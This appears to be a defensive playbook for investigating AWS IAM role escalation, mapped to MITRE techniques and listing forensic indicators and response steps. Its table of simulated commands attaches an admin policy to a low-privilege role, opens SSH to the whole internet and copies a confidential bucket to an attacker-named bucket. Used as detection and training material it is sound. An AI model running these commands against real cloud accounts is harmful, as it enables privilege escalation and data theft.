# ☁️ Cloud Admin Role Drift / Escalation (T1098.003 / T1538.003)

**Explanation:** This playbook analyzes how an adversary exploits weak permissions or stolen credentials to gain unauthorized access, leading to **Cloud Role Drift or Escalation**. The attack chain is anchored on an Identity and Access Management (IAM) event where a principal (user, service, or role) modifies its own or another principal's permissions (T1098.003, Account Manipulation) or uses compromised session tokens to assume a high-privilege role (T1538.003, Cloud Compute Infrastructure Actions). This is the key pivot point to escalate privileges and establish persistence.

---

## 1. Attack Flow, IOCs, and Simulated Commands (AWS Context)

| Phase | MITRE ID & Technique | Primary Investigative Focus (IOCs) | Simulated Attack Command (Payload) |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1078.004 (Valid Accounts) | **Identity:** Authentication from unexpected geolocation, service, or time. | `aws sts get-caller-identity` (Executed from attacker IP) |
| **Execution/Foothold** | T1059.006 (Cloud API/CLI) | **Network:** High volume API calls from a newly active user/IP. | `aws s3 ls --profile compromised-user` (Enumerating exposed assets) |
| **Escalation (ANCHOR)** | **T1098.003 (Modify Cloud Role)** | **Identity/Logs:** `UpdateRolePolicy` or `AttachRolePolicy` API calls. **Resource:** High-privilege policy being attached to a low-privilege role. | `aws iam attach-role-policy --role-name dev-role --policy-arn arn:aws:iam::123456789012:policy/AdminAccess` |
| **Lateral Movement/Discovery** | T1049 (System Network Configuration Discovery) | **Compute/Network:** Unexpected creation or modification of security groups/firewall rules. | `aws ec2 authorize-security-group-ingress --group-id sg-12345 --protocol tcp --port 22 --cidr 0.0.0.0/0` |
| **Impact/Exfiltration** | T1537 (Transfer Data to Cloud Storage) | **Network/Storage:** High volume of `PutObject` or `CopyObject` calls to an external/unrelated S3 bucket. | `aws s3 cp s3://confidential-data s3://attacker-exfil-bucket/ --recursive` |

---

## 2. Key Forensic Artifacts (Data Pivot Points)

### High-Confidence Identity & Log IOCs

1.  **Role Modification Event:** The single highest-fidelity IOC is the **CloudTrail** or **Azure/GCP Audit Log** entry showing `iam:UpdateRolePolicy`, `iam:AttachRolePolicy`, or `iam:CreatePolicyVersion`.
2.  **API Source Anomaly:** A high-privilege API call (e.g., modifying IAM, creating compute instances) originating from a geographic location, IP address, or User Agent string never seen before for that **IAM User** or **Role**.
3.  **Cross-Account AssumeRole:** Detection of a role being assumed (`sts:AssumeRole`) from an external (untrusted) account ID, or the use of short-lived session tokens outside of the expected compute instance/federation service.
4.  **Credential Misuse:** Rapid succession of API calls following the generation or modification of an **Access Key**, suggesting the key was immediately stolen and used.

### Network and Resource IOCs

1.  **New Resource Creation:** The rapid creation of persistent resources, such as a new **EC2/Compute Instance** or **Container Cluster**, which can be used as a stable C2 platform within the cloud network.
2.  **Security Group Changes:** Modifications to **Security Groups** or **Network ACLs (NACLs)** to allow ingress/egress from the attacker's IP space (e.g., adding `0.0.0.0/0` or the attacker's home IP to an RDP/SSH port).
3.  **Compromised Identity:** The user account executing the entire chain must be flagged and all associated cloud access keys, session tokens, and passwords must be revoked immediately.
